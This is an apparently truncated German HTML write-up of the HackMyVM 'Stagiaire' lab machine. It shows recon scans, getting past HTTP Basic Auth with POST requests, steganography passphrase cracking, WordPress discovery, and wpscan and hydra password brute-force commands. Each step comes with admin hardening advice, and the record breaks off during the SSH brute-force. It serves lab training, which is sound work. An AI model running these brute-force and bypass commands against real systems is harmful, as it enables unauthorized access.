@@ -1,0 +1,963 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Stagiaire - HackMyVM - Hard - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css"> <!-- Pfad beibehalten -->
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Stagiaire - HackMyVM - Hard - Bericht</h1> <!-- Titel angepasst -->
+        <div class="level-container">
+            <h2>Hard</h2> <!-- Schwierigkeitsgrad ohne Inline-Style, CSS handhabt Farbe (Rot) -->
+            <div class="circle"> <!-- Kreis-CSS wird 'Hard' (Rot) handhaben -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe wird durch CSS gesetzt -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">dig</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">steghide</div>
+                <div class="tool-item">stegseek</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">wpscan</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">vi (implizit)</div>
+                <div class="tool-item">chmod (implizit)</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">nano (implizit)</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">mysql</div>
+                <div class="tool-item">ln</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">tail</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration-hint-finding">Web Enumeration & Hint Finding</a></li>
+                <li><a href="#wordpress-enumeration">WordPress Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access (SMTP Vector)</a></li>
+                <li><a href="#privilege-escalation-madonna">Privilege Escalation (madonna -> paillette)</a></li>
+                <li><a href="#privilege-escalation-paillette">Privilege Escalation (paillette -> tony)</a></li>
+                <li><a href="#privilege-escalation-tony">Privilege Escalation (tony -> root)</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept (PHP Server Command Injection)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre><span class="command">192.168.2.109	08:00:27:3f:30:2b	PCS Systemtechnik GmbH</span></pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:** Der Befehl `arp-scan -l` wird verwendet, um das lokale Netzwerksegment mittels ARP nach aktiven Geräten zu durchsuchen.</p>
+             <p class="evaluation">**Bewertung:** Ein Host mit der IP-Adresse `192.168.2.109` wird identifiziert. Die MAC-Adresse (`08:00:27:...`) deutet auf eine VirtualBox VM hin. Dies ist das Zielsystem.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Ziel-IP `192.168.2.109` notieren und mit Port-Scanning (Nmap) fortfahren.<br>**Empfehlung (Admin):** Standard-Netzwerkaufklärung. Absicherung der Dienste ist priorisiert.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.109 -p-</span></div>
+                     <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-22 00:31 CEST
+Nmap scan report for stagiaire.hmv (192.168.2.109)
+Host is up (0.00012s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)</span>
+| ssh-hostkey:
+|   3072 9ef1ed84cc418c7ec692a9b42957bfd1 (RSA)
+|   256 9ff393db72ffcd4d5f093edc13364923 (ECDSA)
+|_  256 e7a372ddd5afe2b57750ab3d27120fea (ED25519)
+<span class="command">25/tcp open  smtp    Postfix smtpd</span>
+|_smtp-commands: debian.numericable.fr, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
+| ssl-cert: Subject: commonName=debian
+| Subject Alternative Name: DNS:debian
+| Not valid before: 2021-10-23T15:24:56
+|_Not valid after:  2031-10-21T15:24:56
+|_ssl-date: TLS randomness does not represent time
+<span class="command">80/tcp open  http    Apache httpd 2.4.51</span>
+<span class="password">| http-auth:</span>
+<span class="password">| HTTP/1.1 401 Unauthorized\x0D</span>
+<span class="password">|_  Basic realm=Protected area</span> <span class="password"><-- HTTP Basic Auth!</span>
+|_http-title: 401 Unauthorized
+|_http-server-header: Apache/2.4.51 (Debian)
+MAC Address: 08:00:27:3F:30:2B (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: Host:  debian.numericable.fr; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.12 ms stagiaire.hmv (192.168.2.109)
+
+Nmap done: 1 IP address (1 host up) scanned in X.XX seconds</pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Ein umfassender Nmap-Scan (`-sS -sC -T5 -A -p-`) wird auf das Ziel `192.168.2.109` (stagiaire.hmv) durchgeführt.</p>
+             <p class="evaluation">**Bewertung:** Drei offene TCP-Ports werden identifiziert:
+*   **Port 22 (SSH):** OpenSSH 8.4p1 (Debian). Standard-Fernzugriff, relativ aktuell.
+*   **Port 25 (SMTP):** Postfix SMTP-Server. Interessant für Enumeration von Benutzern (`VRFY` Command) oder als potenzieller Vektor für Angriffe (z.B. E-Mail-Spoofing, Ausnutzung von Fehlkonfigurationen). Der Hostname `debian.numericable.fr` wird preisgegeben.
+*   **Port 80 (HTTP):** Apache 2.4.51 (Debian). Der Zugriff auf die Hauptseite erfordert eine HTTP Basic Authentication (`401 Unauthorized`, Realm "Protected area"). Dies ist ein unmittelbares Hindernis für einfache Web-Enumeration.</p>
+             <p class="recommendation">**Empfehlung (Pentester):**
+    1.  **HTTP (Priorität 1):** Versuchen Sie Standard-Credentials oder Brute-Force gegen die HTTP Basic Auth. Führen Sie trotz der Authentifizierung Web-Scanning-Tools (Nikto, Gobuster) aus, um zu sehen, ob einige Pfade eventuell nicht geschützt sind oder Informationen lecken.
+    2.  **SMTP (Priorität 2):** Versuchen Sie, Benutzernamen über den `VRFY`-Befehl zu enumerieren (falls nicht deaktiviert). Prüfen Sie auf offene Relays oder andere Fehlkonfigurationen.
+    3.  **SSH (Priorität 3):** Halten Sie Ausschau nach Benutzernamen für spätere Brute-Force-Versuche.<br>
+**Empfehlung (Admin):** Wenn HTTP Basic Auth verwendet wird, stellen Sie sicher, dass starke Passwörter verwendet werden und der Schutz konsistent auf alle relevanten Ressourcen angewendet wird. Überprüfen Sie die Postfix-Konfiguration, deaktivieren Sie `VRFY`, wenn nicht benötigt, und stellen Sie sicher, dass es kein offenes Relay ist. Härten Sie die SSH-Konfiguration.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h http://192.168.2.109</span></div>
+                     <pre>
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.109
++ Target Hostname:    192.168.2.109
++ Target Port:        80
++ Start Time:         2022-10-22 00:35:16 (GMT2)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.51 (Debian)
++ <span class="command">The anti-clickjacking X-Frame-Options header is not present.</span>
++ <span class="command">The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span>
++ <span class="command">The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</span>
++ /: <span class="password">Requires Authentication for realm 'Protected area'</span>
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ 8066 requests: 0 error(s) and 3 item(s) reported on remote host
++ End Time:           2022-10-22 00:36:03 (GMT2) (47 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+[...] <span class="comment">(Update-Anfrage von Nikto)</span></pre>
+                     <pre><span class="comment">=</span></pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Das Tool Nikto wird verwendet, um den Webserver auf Port 80 auf bekannte Schwachstellen, Fehlkonfigurationen und interessante Dateien/Verzeichnisse zu scannen.</p>
+             <p class="evaluation">**Bewertung:** Nikto bestätigt die Server-Version (Apache/2.4.51) und die HTTP Basic Authentication auf der Startseite (`/`). Es meldet das Fehlen einiger sicherheitsrelevanter HTTP-Header (X-Frame-Options, X-XSS-Protection, X-Content-Type-Options), was zwar Best Practice ist, aber selten zu direkten Exploits führt. Es wurden keine offensichtlichen CGI-Verzeichnisse oder gravierenden Schwachstellen gefunden.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Die fehlenden Header sind von geringer Priorität. Der Fokus bleibt auf der Umgehung oder dem Knacken der Basic Authentication und der Untersuchung des SMTP-Servers.<br>**Empfehlung (Admin):** Fügen Sie die empfohlenen Sicherheitsheader (X-Frame-Options: DENY/SAMEORIGIN, X-Content-Type-Options: nosniff, Content-Security-Policy) zur Apache-Konfiguration hinzu, um die allgemeine Sicherheit gegen bestimmte clientseitige Angriffe zu erhöhen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u stagiaire.hmv -H "Host: http://FUZZ.stagiaire.hmv" --hc 404 --hh 305</span></div>
+                     <pre>
+[...] <span class="comment">(PyCurl SSL Warning)</span>
+Target: stagiaire.hmv
+[...]
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+<span class="comment">Total time: 150.2931 seconds</span>
+<span class="command">Processed Requests: 220560</span>
+<span class="command">Filtered Requests: 220560</span> <span class="password"><-- Keine Ergebnisse gefunden --></span>
+<span class="command">Requests/sec.: 1467.532</span></pre>
+                     <pre><span class="comment">=</span></pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Hier wird `wfuzz` verwendet, um nach virtuellen Hosts (VHosts) zu suchen. Es wird die Ziel-URL `stagiaire.hmv` (die aber laut `dig` nicht auflöst, daher wird vermutlich die IP `192.168.2.109` verwendet) abgefragt. Mit `-H "Host: http://FUZZ.stagiaire.hmv"` wird der Host-Header manipuliert, wobei `FUZZ` durch Einträge aus der Wortliste ersetzt wird. `--hc 404` filtert 404-Fehler heraus, `--hh 305` filtert Antworten mit 305 Zeichen heraus (dies wird oft verwendet, um Standard-"Seite nicht gefunden"-Antworten auszublenden).</p>
+             <p class="evaluation">**Bewertung:** Der Scan liefert keine Ergebnisse (Filtered Requests = Processed Requests). Es wurden keine zusätzlichen virtuellen Hosts gefunden, die einen anderen Inhalt als die Standard-IP-Adresse liefern.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** VHost-Enumeration war erfolglos. Konzentrieren Sie sich auf die bekannten Dienste und die HTTP Basic Auth.<br>**Empfehlung (Admin):** Keine spezifische Aktion erforderlich, außer sicherzustellen, dass die VHost-Konfiguration korrekt ist und keine unerwünschten Hosts aktiv sind.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">dig http://stagiaire.hmv</span></div>
+                     <pre>
+; <<>> DiG 9.18.7-1-Debian <<>> http://stagiaire.hmv
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: <span class="command">NXDOMAIN</span>, id: 58599
+;; flags: qr rd ra ad; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 512
+;; QUESTION SECTION:
+;<span class="command">http://stagiaire.hmv.</span>		IN	A
+
+;; AUTHORITY SECTION:
+.			3514	IN	SOA	a.root-servers.net. nstld.verisign-grs.com. 2022102102 1800 900 604800 86400
+
+;; Query time: 7 msec
+;; SERVER: 192.168.2.1#53(192.168.2.1) (UDP)
+;; WHEN: Sat Oct 22 00:52:45 CEST 2022
+;; MSG SIZE  rcvd: 124</pre>
+                     <pre><span class="comment">#</span></pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Der Befehl `dig` wird verwendet, um eine DNS-Abfrage für den Hostnamen `http://stagiaire.hmv` durchzuführen. *Hinweis: `http://` sollte nicht Teil des Hostnamens sein, `dig stagiaire.hmv` wäre korrekt gewesen.*</p>
+             <p class="evaluation">**Bewertung:** Die Abfrage schlägt fehl (`status: NXDOMAIN`), was bedeutet, dass der DNS-Server (`192.168.2.1`) den Namen `http://stagiaire.hmv` (oder `stagiaire.hmv`) nicht auflösen kann. Dies bestätigt, dass der Hostname, falls er vom Zielsystem verwendet wird, nicht im lokalen DNS bekannt ist. Für den Zugriff muss die IP-Adresse verwendet werden, es sei denn, der Name wird manuell in die lokale `/etc/hosts`-Datei eingetragen.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Verwenden Sie weiterhin die IP-Adresse `192.168.2.109` für den Zugriff. Fügen Sie `stagiaire.hmv` nur dann zur `/etc/hosts`-Datei hinzu, wenn es Hinweise gibt, dass der Server auf diesen Namen spezifisch reagiert.<br>**Empfehlung (Admin):** Stellen Sie sicher, dass interne Hostnamen korrekt im DNS registriert sind, falls erforderlich.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -I http://192.168.2.109</span></div>
+                     <pre>
+HTTP/1.1 401 Unauthorized
+Date: Fri, 21 Oct 2022 22:53:07 GMT
+Server: Apache/2.4.51 (Debian)
+<span class="command">WWW-Authenticate: Basic realm="Protected area"</span>
+Content-Type: text/html; charset=iso-8859-1</pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** `curl -I` wird verwendet, um nur die HTTP-Header für eine Anfrage an die Wurzel (`/`) des Webservers auf Port 80 abzurufen.</p>
+             <p class="evaluation">**Bewertung:** Bestätigt erneut den Status `401 Unauthorized` und den `WWW-Authenticate`-Header für HTTP Basic Authentication mit dem Realm "Protected area".</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Der nächste logische Schritt wäre ein Brute-Force-Angriff auf diese Basic Authentication, falls keine anderen Schwachstellen gefunden werden.<br>**Empfehlung (Admin):** Verwenden Sie starke Passwörter für Basic Auth oder bevorzugen Sie robustere Authentifizierungsmethoden.</p>
+        </section>
+
+        <section id="web-enumeration-hint-finding">
+             <h2>Web Enumeration & Hint Finding</h2>
+             <p class="analysis">**Analyse:** Trotz der Basic Authentication werden verschiedene HTTP-Methoden und Pfade getestet, um nach Informationslecks oder Hinweisen zu suchen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -X PUT http://192.168.2.109/index.php</span></div>
+                     <pre><span class="command"><img src="madonna.jpg" alt=""></span></pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Eine HTTP PUT-Anfrage wird an den Pfad `/index.php` gesendet. Überraschenderweise antwortet der Server nicht mit einem Fehler (wie 401 Unauthorized oder 404 Not Found), sondern mit einem HTML-Fragment, das ein Bild `madonna.jpg` referenziert.</p>
+             <p class="evaluation">**Bewertung:** Dieses Verhalten ist höchst ungewöhnlich. Eine PUT-Anfrage sollte normalerweise nicht mit einem HTML-Image-Tag beantwortet werden. Dies deutet auf eine Fehlkonfiguration oder eine absichtlich platzierte "Easter Egg"/Hinweis-Mechanik hin. Der Dateiname `madonna.jpg` ist der Schlüsselhinweis.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Versuchen Sie, die Datei `madonna.jpg` herunterzuladen (auch wenn der erste Versuch mit `wget` fehlschlug). Der Name "madonna" könnte auch ein Benutzername sein.<br>**Empfehlung (Admin):** Untersuchen Sie die Apache-Konfiguration. Warum antwortet der Server auf PUT-Anfragen an `/index.php` auf diese Weise? Beheben Sie diese Fehlkonfiguration.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wget http://192.168.2.109/madonna.jpg</span></div>
+                     <pre>
+--2022-10-22 00:54:59--  http://192.168.2.109/madonna.jpg
+Verbindungsaufbau zu 192.168.2.109:80 … verbunden.
+HTTP-Anforderung gesendet, auf Antwort wird gewartet … <span class="password">401 Unauthorized</span>
+
+Authentifizierung mit Benutzername/Passwort fehlgeschlagen.</pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Der Versuch, `madonna.jpg` direkt mit `wget` (das eine GET-Anfrage sendet) herunterzuladen, schlägt wie erwartet aufgrund der HTTP Basic Authentication (401 Unauthorized) fehl.</p>
+             <p class="evaluation">**Bewertung:** Bestätigt, dass die Datei `/madonna.jpg` existiert, aber durch Basic Auth geschützt ist.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Versuchen Sie andere HTTP-Methoden (wie POST im nächsten Schritt), um die Datei zu erhalten, oder versuchen Sie, die Basic Auth zu knacken.<br>**Empfehlung (Admin):** Stellen Sie sicher, dass der Schutz konsistent angewendet wird.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -X POST http://192.168.2.109/madonna.jpg --output ben.jpg</span></div>
+                     <pre>
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  127k  100  127k    0     0  7092k      0 --:--:-- --:--:-- --:--:-- 7470k</pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Eine HTTP POST-Anfrage wird an `/madonna.jpg` gesendet. Die Option `--output ben.jpg` speichert die Antwort des Servers in einer lokalen Datei namens `ben.jpg`. Überraschenderweise gelingt der Download mit POST, obwohl GET blockiert wurde.</p>
+             <p class="evaluation">**Bewertung:** Dies ist eine klare Fehlkonfiguration des Authentifizierungsschutzes. Die Basic Authentication wird nicht auf POST-Anfragen für diese Datei angewendet. Die Bilddatei `madonna.jpg` konnte heruntergeladen werden.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Untersuchen Sie die heruntergeladene Datei `ben.jpg` auf versteckte Informationen (Metadaten, Steganographie).<br>**Empfehlung (Admin):** Korrigieren Sie die Apache-Konfiguration, um sicherzustellen, dass die HTTP Basic Authentication auf alle relevanten HTTP-Methoden (GET, POST, etc.) für geschützte Ressourcen angewendet wird.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">steghide extract -sf ben.jpg</span></div>
+                    <pre>Passwort eingeben:</pre> <span class="comment"><-- Passwort unbekannt --></span>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Es wird versucht, mit `steghide` versteckte Daten aus der heruntergeladenen Bilddatei `ben.jpg` zu extrahieren. `steghide` benötigt eine Passphrase.</p>
+             <p class="evaluation">**Bewertung:** Ohne die korrekte Passphrase kann `steghide` keine Daten extrahieren. Der Versuch schlägt fehl.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Versuchen Sie, die Passphrase mit Steganographie-Bruteforce-Tools wie `stegseek` zu finden.<br>**Empfehlung (Admin):** Keine.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stegseek ben.jpg /usr/share/wordlists/rockyou.txt</span></div>
+                     <pre>
+StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+
+[i] Found passphrase: <span class="password">"freeze"</span>
+[i] Original filename: "info.txt".
+[i] Extracting to "ben.jpg.out".</pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Das Tool `stegseek` wird verwendet, um die `steghide`-Passphrase für `ben.jpg` mittels der `rockyou.txt`-Wortliste zu bruteforcen.</p>
+             <p class="evaluation">**Bewertung:** Erfolg! `stegseek` findet die Passphrase `freeze` und extrahiert die versteckte Datei unter dem Namen `ben.jpg.out` (der ursprüngliche Dateiname war `info.txt`).</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Untersuchen Sie den Inhalt der extrahierten Datei `ben.jpg.out` (oder `info.txt`).<br>**Empfehlung (Admin):** Keine.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat ben.jpg.out</span></div>
+                    <pre>Don't waste your time I hate CTFs lol</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">steghide extract -sf ben.jpg</span></div>
+                     <pre>
+Passwort eingeben: <span class="password">********</span> <span class="comment">(freeze eingegeben)</span>
+Extrahierte Daten wurden nach "info.txt" geschrieben.</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat info.txt</span></div>
+                     <pre>Don't waste your time I hate CTFs lol</pre>
+                     <pre><span class="comment">=</span></pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Der Inhalt der extrahierten Datei (`ben.jpg.out` und `info.txt` nach erneuter Extraktion mit `steghide` und der bekannten Passphrase `freeze`) wird angezeigt.</p>
+             <p class="evaluation">**Bewertung:** Der Inhalt ist eine Troll-Nachricht ("Don't waste your time I hate CTFs lol") und liefert scheinbar keine direkten Hinweise.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Die Steganographie war eine Sackgasse oder ein Scherz. Überprüfen Sie, ob der *Dateiname* `info.txt` selbst ein Hinweis ist. Versuchen Sie, diesen Pfad auf dem Webserver abzurufen.<br>**Empfehlung (Admin):** Keine.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh madonna@stagiaire.hmv</span></div>
+                     <pre>
+[...] <span class="comment">(Authenticity prompt)</span>
+madonna@stagiaire.hmv's password: <span class="comment"> (Versuch mit 'freeze'?)</span>
+<span class="password">Permission denied, please try again.</span>
+madonna@stagiaire.hmv's password:</pre> <span class="comment"><-- Login fehlgeschlagen --></span>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Es wird versucht, sich per SSH als Benutzer `madonna` (aus dem Dateinamen `madonna.jpg`) anzumelden. Es wird ein Passwort eingegeben (möglicherweise `freeze` aus der Steganographie?), aber der Login schlägt fehl (`Permission denied`).</p>
+              <p class="evaluation">**Bewertung:** Der Benutzername `madonna` existiert möglicherweise, aber die Passphrase `freeze` ist nicht das SSH-Passwort. Der Hinweis aus der Steganographie bezog sich nur auf die versteckte Datei.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Versuchen Sie, den zuvor gefundenen Dateinamen `info.txt` als Pfad auf dem Webserver zu verwenden (`curl -X POST http://192.168.2.109/info.txt`).<br>**Empfehlung (Admin):** Keine.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -X POST http://192.168.2.109/info.txt</span></div>
+                    <pre><span class="command">/madonnasecretlife</span></pre>
+                     <pre><span class="comment">-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span></pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Eine POST-Anfrage wird an den Pfad `/info.txt` auf dem Webserver gesendet (basierend auf dem Dateinamen aus der Steganographie).</p>
+             <p class="evaluation">**Bewertung:** Wieder ein Erfolg durch die ungewöhnliche Serverkonfiguration! Der Server antwortet mit einem Pfad: `/madonnasecretlife`. Dies ist höchstwahrscheinlich der Pfad zu einer versteckten Webanwendung.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Untersuchen Sie den Pfad `/madonnasecretlife` auf dem Webserver (`http://192.168.2.109/madonnasecretlife/`) mit einem Browser und Enumeration-Tools (Gobuster).<br>**Empfehlung (Admin):** Beheben Sie die Konfiguration, die es erlaubt, auf POST-Anfragen an beliebige Pfade mit Hinweisen zu antworten. Sichern Sie die Anwendung unter `/madonnasecretlife`.</p>
+        </section>
+
+        <section id="wordpress-enumeration">
+             <h2>WordPress Enumeration</h2>
+             <p class="analysis">**Analyse:** Untersuchung des im vorherigen Schritt gefundenen Verzeichnisses `/madonnasecretlife`.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.109/madonnasecretlife -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x .git,php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,dsd,mp3,mp4,mkv -t 100</span></div>
+                     <pre>
+===============================================================
+Gobuster v3.1.0
+[...]
+===============================================================
+[+] Url:                     http://192.168.2.109/madonnasecretlife
+[...]
+===============================================================
+[... Zeitstempel ...] Starting gobuster
+===============================================================
+<span class="command">/index.php</span>            (Status: 301) [Size: 0] [--> http://192.168.2.109/madonnasecretlife/]
+<span class="command">/wp-content</span>           (Status: 301) [Size: 337] [--> http://192.168.2.109/madonnasecretlife/wp-content/]
+<span class="command">/wp-login.php</span>         (Status: 200) [Size: 6427] <span class="password"><-- WordPress Login</span>
+<span class="command">/license.txt</span>          (Status: 200) [Size: 19915]
+<span class="command">/wp-includes</span>          (Status: 301) [Size: 338] [--> http://192.168.2.109/madonnasecretlife/wp-includes/]
+<span class="command">/readme.html</span>          (Status: 200) [Size: 7346]
+<span class="command">/wp-trackback.php</span>     (Status: 200) [Size: 135]
+<span class="command">/wp-admin</span>             (Status: 301) [Size: 335] [--> http://192.168.2.109/madonnasecretlife/wp-admin/]
+<span class="command">/xmlrpc.php</span>           (Status: 405) [Size: 42] <span class="comment"><-- Methode nicht erlaubt, aber existiert --></span>
+[...]
+===============================================================
+[... Zeitstempel ...] Finished
+===============================================================</pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Gobuster wird auf das Verzeichnis `/madonnasecretlife` angesetzt.</p>
+             <p class="evaluation">**Bewertung:** Die gefundenen Pfade (`wp-content`, `wp-login.php`, `wp-admin`, `wp-includes`, `xmlrpc.php`, `readme.html`, `license.txt`) sind eindeutige Indikatoren für eine WordPress-Installation.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Führen Sie einen spezialisierten WordPress-Scanner wie `wpscan` aus, um die Version, installierte Plugins/Themes und bekannte Schwachstellen zu identifizieren. Versuchen Sie, Benutzernamen zu enumerieren (z.B. über Autor-Scans oder `wpscan`). Versuchen Sie einen Login auf `/madonnasecretlife/wp-login.php` mit dem Benutzernamen `madonna` und potenziellen Passwörtern.<br>**Empfehlung (Admin):** Halten Sie WordPress Core, Themes und Plugins immer aktuell. Entfernen Sie unnötige Dateien wie `readme.html` oder `license.txt`. Deaktivieren Sie `xmlrpc.php`, wenn es nicht benötigt wird (häufiger Angriffsvektor für Brute-Force). Schützen Sie das Login (`wp-login.php`) zusätzlich (z.B. Fail2Ban, 2FA, IP-Whitelisting).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wpscan --url http://stagiaire.hmv/madonnasecretlife/wp-login.php --api-token ... --usernames madonna --passwords /usr/share/wordlists/rockyou.txt</span></div>
+                     <pre><span class="comment">[... WPScan Ausgabe nicht im Log enthalten ...]</span></pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Es wird versucht, `wpscan` zu verwenden, um einen Passwort-Brute-Force-Angriff gegen den WordPress-Login durchzuführen. Ziel ist der Benutzer `madonna` mit der Passwortliste `rockyou.txt`. Ein API-Token wird verwendet, um Schwachstellendaten abzurufen.</p>
+             <p class="evaluation">**Bewertung:** Die Ausgabe von `wpscan` fehlt im Log. Es ist anzunehmen, dass der Brute-Force-Angriff auf den WordPress-Login erfolglos war, da im nächsten Schritt ein Brute-Force gegen SSH versucht wird.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Wenn WPScan keine Schwachstellen oder gültigen Logins findet, evaluieren Sie andere Angriffsvektoren neu (SMTP, SSH).<br>**Empfehlung (Admin):** Schützen Sie den WordPress-Login vor Brute-Force-Angriffen (z.B. Limit Login Attempts Plugin, Fail2Ban, starke Passwörter).</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -l madonna -P /usr/share/wordlists/rockyou.txt ssh://stagiaire.hmv -I -T 64</span></div>
+                     <pre>
+Hydra v9.3 [...] starting at 2022-10-22 01:04:17
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[...]
+[DATA] attacking ssh://stagiaire.hmv:22/
